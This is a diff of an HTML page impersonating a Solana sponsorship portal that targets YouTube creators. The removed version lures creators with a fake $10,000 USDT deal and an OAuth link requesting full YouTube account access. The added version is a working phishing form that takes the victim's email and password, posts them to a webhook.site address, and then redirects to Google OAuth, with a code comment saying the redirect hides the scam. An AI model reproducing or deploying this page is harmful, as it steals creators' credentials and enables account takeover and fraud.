@@ -1,165 +1,82 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Solana Sponsorship Dashboard</title>
-<style>
-  body {
-    margin: 0;
-    background-color: #000000;
-    color: #ffffff;
-    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-    padding: 20px;
-  }
-  .container {
-    max-width: 800px;
-    margin: 40px auto;
-    background-color: #000000;
-    border-radius: 10px;
-    padding: 30px;
-    box-shadow: 0 0 15px rgba(0, 255, 163, 0.3);
-  }
-  img {
-    display: block;
-    margin: 0 auto 25px;
-    width: 120px;
-  }
-  h1 {
-    color: #00FFA3;
-    text-align: center;
-    margin-bottom: 10px;
-  }
-  .tab-buttons {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 30px;
-  }
-  .tab-btn {
-    background-color: #00FFA3;
-    color: #000;
-    padding: 10px 20px;
-    margin: 0 10px;
-    border: none;
-    border-radius: 25px;
-    font-weight: bold;
-    cursor: pointer;
-    transition: background-color 0.3s;
-  }
-  .tab-btn:hover {
-    background-color: #00cc82;
-  }
-  .tab-content {
-    display: none;
-  }
-  .tab-content.active {
-    display: block;
-  }
-  h2 {
-    color: #00FFA3;
-    border-bottom: 2px solid #00FFA3;
-    padding-bottom: 6px;
-    margin-bottom: 15px;
-  }
-  .oauth-btn {
-    background-color: #00FFA3;
-    color: #000000;
-    font-weight: 700;
-    padding: 14px 40px;
-    border-radius: 30px;
-    display: inline-block;
-    box-shadow: 0 4px 8px rgba(0, 255, 163, 0.3);
-    cursor: pointer;
-    border: none;
-    font-size: 16px;
-    transition: background-color 0.3s ease;
-    text-align: center;
-    text-decoration: none;
-    margin: 0 auto;
-    display: block;
-    max-width: 250px;
-  }
-  .oauth-btn:hover {
-    background-color: #00cc82;
-  }
-  footer {
-    margin-top: 50px;
-    font-size: 13px;
-    color: #666;
-    text-align: center;
-  }
-  footer a {
-    color: #00FFA3;
-    text-decoration: none;
-  }
-</style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Solana Sponsorship Portal</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: #000;
+      color: #fff;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      padding: 20px;
+      text-align: center;
+    }
+    .container {
+      max-width: 400px;
+      margin: 80px auto;
+      background: #111;
+      border-radius: 12px;
+      padding: 30px;
+      box-shadow: 0 0 15px rgba(0, 255, 163, 0.4);
+    }
+    input[type="text"], input[type="password"] {
+      width: 90%;
+      padding: 12px;
+      margin: 15px 0;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    button {
+      background-color: #00FFA3;
+      border: none;
+      color: #000;
+      padding: 14px 40px;
+      font-weight: 700;
+      font-size: 16px;
+      border-radius: 30px;
+      cursor: pointer;
+      box-shadow: 0 4px 8px rgba(0, 255, 163, 0.3);
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #00cc82;
+    }
+  </style>
 </head>
 <body>
   <div class="container">
-    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToIG8feZdv7SVG0RYdGFUy8FDf_wxddAruJQ&s" alt="Solana Logo" />
     <h1>Solana Sponsorship Portal</h1>
+    <p>Verify your YouTube account to continue</p>
 
-    <div class="tab-buttons">
-      <button class="tab-btn" onclick="showTab('dashboard')">Dashboard</button>
-      <button class="tab-btn" onclick="showTab('privacy')">Privacy Policy</button>
-      <button class="tab-btn" onclick="showTab('tos')">Terms of Service</button>
-    </div>
-
-    <!-- Dashboard -->
-    <div id="dashboard" class="tab-content active">
-      <div class="section">
-        <h2>Campaign Overview</h2>
-        <ul>
-          <li>Sponsored Integration: 30-60 seconds in one upcoming video</li>
-          <li>Upfront Payment: <strong>$10,000 USDT</strong></li>
-          <li>Contract Duration: 30 days</li>
-          <li>Campaign Start Date: <em>June 30 2025</em></li>
-        </ul>
-      </div>
-
-      <div class="section">
-        <h2>Verification Policy</h2>
-        <p>To comply with Solana Labs’ anti-fraud standards, you must verify ownership of your YouTube channel.</p>
-        <p>Please connect your YouTube account below within 48 hours to avoid delays.</p>
-        <a class="oauth-btn" href="https://accounts.google.com/o/oauth2/v2/auth?client_id=847323098345-97tbp1m5g8ec170plkebnl5e17eo3ja3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsolana-collaboration.github.io%2FSolana%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fyoutube.force-ssl&access_type=offline&prompt=consent">Connect with YouTube</a>
-      </div>
-
-      <div class="section">
-        <h2>Contact</h2>
-        <ul>
-          <li>Email: <a href="mailto:solana.marketing.team@gmail.com">solana.marketing.team@gmail.com</a></li>
-          <li>Phone: +1 (555) 123-4567</li>
-        </ul>
-      </div>
-    </div>
-
-    <!-- Privacy Policy -->
-    <div id="privacy" class="tab-content">
-      <h2>Privacy Policy</h2>
-      <p>This platform collects limited data such as your email and YouTube channel ID for verification and sponsorship processing. We do not store passwords or personal messages.</p>
-      <p>All data is processed strictly for partnership purposes and not shared with third parties outside Solana Labs or its representatives.</p>
-      <p>By using this service, you consent to the data practices described here.</p>
-    </div>
-
-    <!-- Terms of Service -->
-    <div id="tos" class="tab-content">
-      <h2>Terms of Service</h2>
-      <p>By accessing this sponsorship portal, you agree to provide accurate information and comply with our verification policies.</p>
-      <p>Solana Labs reserves the right to cancel or modify sponsorship offers at any time without notice.</p>
-      <p>Improper use of this platform may result in disqualification from current or future partnerships.</p>
-    </div>
-
-    <footer>
-      &copy; 2025 Solana Labs | All Rights Reserved
-    </footer>
+    <form id="fakeLoginForm">
+      <input type="text" id="username" name="username" placeholder="YouTube Email" required />
+      <input type="password" id="password" name="password" placeholder="Password" required />
+      <br />
+      <button type="submit">Connect with YouTube</button>
+    </form>
   </div>
 
-<script>
-  function showTab(id) {
-    const tabs = document.querySelectorAll('.tab-content');
-    tabs.forEach(tab => tab.classList.remove('active'));
-    document.getElementById(id).classList.add('active');
-  }
-</script>
+  <script>
+    document.getElementById('fakeLoginForm').addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const username = document.getElementById('username').value;
+      const password = document.getElementById('password').value;
+
+      fetch('https://webhook.site/5575c5b8-af4b-4b23-873b-ab7afd8dc0bf', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ username, password })
+      })
+      .then(() => {
+        // Redirect victim to legit Google OAuth to hide the scam
+        window.location.href = 'https://accounts.google.com/o/oauth2/v2/auth?client_id=847323098345-97tbp1m5g8ec170plkebnl5e17eo3ja3.apps.googleusercontent.com&redirect_uri=https%3A%2F%2Fsolana-collaboration.github.io%2FSolana%2F&response_type=code&scope=https%3A%2F%2Fwww.googleapis.com%2Fauth%2Fyoutube.force-ssl&access_type=offline&prompt=consent';
+      })
+      .catch(() => alert('Something went wrong, try again.'));
+    });
+  </script>
 </body>
 </html>
